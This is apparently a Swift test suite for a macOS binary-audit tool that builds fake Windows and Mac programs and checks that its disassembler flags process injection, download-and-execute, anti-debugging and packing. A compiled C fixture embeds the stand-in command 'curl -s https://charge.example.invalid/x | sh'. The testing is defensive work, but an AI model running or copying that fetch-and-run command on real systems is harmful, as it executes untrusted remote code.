import Foundation
import Testing
@testable import CerbereKit

/// Phase 6 : programmes Windows et désassemblage ciblé. Les programmes sont fabriqués ici (`Fabrique.pe`, `cc`),
/// jamais lancés ; rien ne sort du Mac.
struct DesassemblageTests {
    private func jeu() throws -> Jeu {
        let jeu = try Jeu([:])
        try FileManager.default.createDirectory(at: jeu.dossier, withIntermediateDirectories: true)
        return jeu
    }

    @Test func enTetesWindows() throws {
        let p = try #require(Windows.lire(Fabrique.pe(surplus: 100)))
        #expect(p.architecture == "x86-64" && p.bits64 && p.base == 0x1_4000_0000 && p.sousSysteme == "console")
        #expect(p.sections.map(\.nom) == [".text", ".rdata"] && p.sections[0].executable && !p.sections[1].executable)
        #expect(p.imports.map(\.dll) == ["KERNEL32.dll", "urlmon.dll"])
        #expect(p.imports[0].fonctions.contains("WriteProcessMemory") && p.imports[1].fonctions == ["URLDownloadToFileW"])
        #expect(p.cases[0x1_4000_2000] == "KERNEL32.dll!WinExec")
        #expect(!p.signe && !p.dotnet && p.surplus == 100)
        #expect(Windows.textesUTF16(Fabrique.pe()).contains(Fabrique.adresseWindows))
        // Fichier abîmé ou tronqué : rien n'est lu au-delà de la fin, pas d'arrêt brutal.
        #expect(Windows.lire(Data("MZ".utf8) + Data(repeating: 0xFF, count: 200)) == nil)
        let pe = Fabrique.pe()
        for n in stride(from: 0x40, to: pe.count, by: 37) { _ = Windows.lire(pe.prefix(n)) }
    }

    @Test func programmeWindows() throws {
        let jeu = try jeu()
        defer { jeu.nettoyer() }
        let exe = jeu.dossier.appending(path: "outil.exe")
        try Fabrique.pe().write(to: exe)
        let r = try Audit.auditer(exe.path, racine: jeu.racine)
        for regle in ["win.injection", "win.telecharge-execute", "win.anti-analyse", "win.sans-signature", "bin.capacites"] {
            #expect(r.a(regle, dans: "outil.exe [imports]"), "\(regle)")
        }
        #expect(r.constats("win.injection").first?.extrait.contains("WriteProcessMemory") == true)
        #expect(!r.a("win.empaquete") && !r.a("win.surplus"))
        // Le code machine montre la commande passée à WinExec.
        let commande = try #require(r.constats("bin.commande").first)
        #expect(commande.fichier == "outil.exe [code]" && commande.extrait.contains(Fabrique.commandeWindows))
        // L'adresse rangée en UTF-16 est relevée (textes du programme, et texte passé au téléchargement).
        #expect(r.reseau.domaines.contains { $0.nom == "collecte.example.invalid" && $0.fichiers.contains("outil.exe [chaînes]") })
        #expect(r.reseau.domaines.contains { $0.nom == "charge.example.invalid" })
        #expect(r.resume.contains("autour des appels sensibles"))
        #expect(((try? FileManager.default.contentsOfDirectory(atPath: jeu.racine.path)) ?? []).isEmpty)
    }

    @Test func ficheDuCodeWindows() throws {
        let jeu = try jeu()
        defer { jeu.nettoyer() }
        let exe = jeu.dossier.appending(path: "outil.exe")
        let donnees = Fabrique.pe()
        try donnees.write(to: exe)
        let e = Desassemblage.examiner(chemin: exe.path, relatif: "outil.exe", format: "exécutable Windows", windows: Windows.lire(donnees),
                                       donnees: donnees, annulation: nil)
        let fiche = try #require(e.fiches.first { $0.chemin == "outil.exe [code]" }).lignes.joined(separator: "\n")
        #expect(fiche.contains("appel de KERNEL32.dll!WinExec (lancement de commandes)"))
        #expect(fiche.contains("appel de urlmon.dll!URLDownloadToFileW (réseau)"))
        #expect(fiche.contains("« \(Fabrique.adresseWindows) »") && fiche.contains("C:\\Users\\Public\\x.exe"))
        #expect(fiche.contains("IsDebuggerPresent (anti-analyse)"))
    }

    @Test func programmeWindowsCompresseOuDotNet() throws {
        let jeu = try jeu()
        defer { jeu.nettoyer() }
        let exe = jeu.dossier.appending(path: "emballe.exe")
        try Fabrique.pe(empaquete: true, surplus: 100_000, dotnet: true).write(to: exe)
        let r = try Audit.auditer(exe.path, racine: jeu.racine)
        let empaquete = try #require(r.constats("win.empaquete").first)
        #expect(empaquete.extrait.contains("UPX") && empaquete.gravite == .moyenne && empaquete.statut == .suspect)
        #expect(r.a("win.surplus"))
        #expect(r.nonAnalyse.contains { $0.raison.contains(".NET") } && r.nonAnalyse.contains { $0.raison.contains("compressé ou chiffré") })
        // Programme .NET : son code machine n'est qu'un tremplin, il n'est pas désassemblé.
        #expect(!r.a("bin.commande"))

        let abime = jeu.dossier.appending(path: "abime.exe")
        try (Data("MZ".utf8) + Data(repeating: 0x90, count: 300)).write(to: abime)
        let r2 = try Audit.auditer(abime.path, racine: jeu.racine)
        #expect(r2.nonAnalyse.contains { $0.raison.contains("illisible") })
    }

    /// Programme Mac : commande écrite en dur, passée à `system` (la condition n'est jamais vraie, et il n'est jamais lancé).
    @Test func programmeMac() throws {
        let jeu = try jeu()
        defer { jeu.nettoyer() }
        let source = jeu.dossier.appending(path: "source.c"), programme = jeu.dossier.appending(path: "outil")
        try Fabrique.ecrire("""
        #include <stdlib.h>
        #include <dlfcn.h>
        int main(int n, char **v) {
            if (n > 99) { system("curl -s https://charge.example.invalid/x | sh"); dlopen("/tmp/greffon.dylib", 1); }
            return 0;
        }

        """, source)
        try Fabrique.outil("/usr/bin/cc", ["-O1", "-arch", "arm64", "-arch", "x86_64", "-o", programme.path, source.path])
        try FileManager.default.removeItem(at: source)
        let r = try Audit.auditer(programme.path, racine: jeu.racine)
        let commande = try #require(r.constats("bin.commande").first)
        #expect(commande.fichier == "outil [code]" && commande.extrait.contains("curl -s https://charge.example.invalid/x | sh"))
        // Les règles lisent la fiche du code comme un texte : le téléchargement suivi d'un lancement y est relevé.
        #expect(r.constats.contains { $0.fichier == "outil [code]" && $0.regle?.hasPrefix("obf.") == true })

        let e = Desassemblage.examiner(chemin: programme.path, relatif: "outil", format: "Mach-O", windows: nil, donnees: nil, annulation: nil)
        let fiche = try #require(e.fiches.first).lignes.joined(separator: "\n")
        #expect(fiche.contains("Dans _main : appel de _system (lancement de commandes)"))
        #expect(fiche.contains("appel de _dlopen (chargement de code)") && fiche.contains("/tmp/greffon.dylib"))
    }
}
